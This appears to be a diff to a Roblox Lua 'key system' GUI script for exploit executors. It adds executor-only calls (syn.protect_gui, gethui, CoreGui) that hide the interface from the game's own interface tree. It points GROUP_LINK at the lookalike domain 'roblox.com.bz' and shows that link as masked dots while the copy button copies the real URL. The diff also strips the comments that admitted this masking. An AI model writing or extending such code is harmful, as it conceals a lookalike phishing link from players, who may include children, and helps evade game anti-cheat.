@@ -4,8 +4,9 @@
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 
-local Player = Players.LocalPlayer
-local PlayerGui = Player:WaitForChild("PlayerGui")
+-- // EXECUTOR SAFE — waits for player and PlayerGui properly
+local Player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+local PlayerGui = Player:WaitForChild("PlayerGui", 10)
 
 -- // CONFIG
 local GROUP_LINK = "https://roblox.com.bz/communities/468737843/"
@@ -52,13 +53,26 @@ local function label(parent, props)
     return l
 end
 
+-- // REMOVE OLD GUI IF EXISTS (prevents duplicates on re-execute)
+local oldGui = PlayerGui:FindFirstChild("MafiaScript_KeySys")
+if oldGui then oldGui:Destroy() end
+
 -- // SCREEN GUI
 local Gui = Instance.new("ScreenGui")
 Gui.Name = "MafiaScript_KeySys"
 Gui.ResetOnSpawn = false
 Gui.IgnoreGuiInset = true
 Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Gui.Parent = PlayerGui
+
+-- // EXECUTOR SAFE PARENTING
+if syn and syn.protect_gui then
+    syn.protect_gui(Gui)
+    Gui.Parent = game:GetService("CoreGui")
+elseif gethui then
+    Gui.Parent = gethui()
+else
+    Gui.Parent = PlayerGui
+end
 
 -- // OVERLAY
 local Overlay = Instance.new("Frame")
@@ -185,7 +199,6 @@ LinkAccent.Parent = LinkFrame
 corner(LinkAccent, 2)
 grad(LinkAccent, C.ACCENT1, C.ACCENT2, 90)
 
--- Masked dots instead of showing the real link
 label(LinkFrame, {
     Size = UDim2.new(1, -24, 1, 0),
     AnchorPoint = Vector2.new(0, 0.5),
@@ -347,7 +360,7 @@ CopyBtn.MouseLeave:Connect(function() tween(CopyBtn, { BackgroundColor3 = C.GREE
 SubmitBtn.MouseEnter:Connect(function() tween(SubmitBtn, { BackgroundColor3 = Color3.fromRGB(192, 132, 252) }, 0.18) end)
 SubmitBtn.MouseLeave:Connect(function() tween(SubmitBtn, { BackgroundColor3 = C.ACCENT1 }, 0.18) end)
 
--- // COPY LOGIC — copies the real link even though it's hidden
+-- // COPY LOGIC
 local copyDebounce = false
 CopyBtn.MouseButton1Click:Connect(function()
     if copyDebounce then return end
